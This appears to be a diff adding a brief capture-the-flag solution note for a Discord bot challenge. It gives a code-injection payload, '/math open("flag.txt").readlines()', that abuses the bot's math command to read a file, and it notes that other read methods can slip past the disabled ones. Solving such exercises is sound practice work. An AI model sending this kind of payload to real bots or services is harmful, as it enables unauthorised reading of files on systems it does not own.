@@ -1,0 +1,6 @@
+Command to input into math command (on Discord):
+
+/math open("flag.txt").readlines() 
+
+Other read methods are also options. Refer to the source code to see the 
+methods that are disabled.
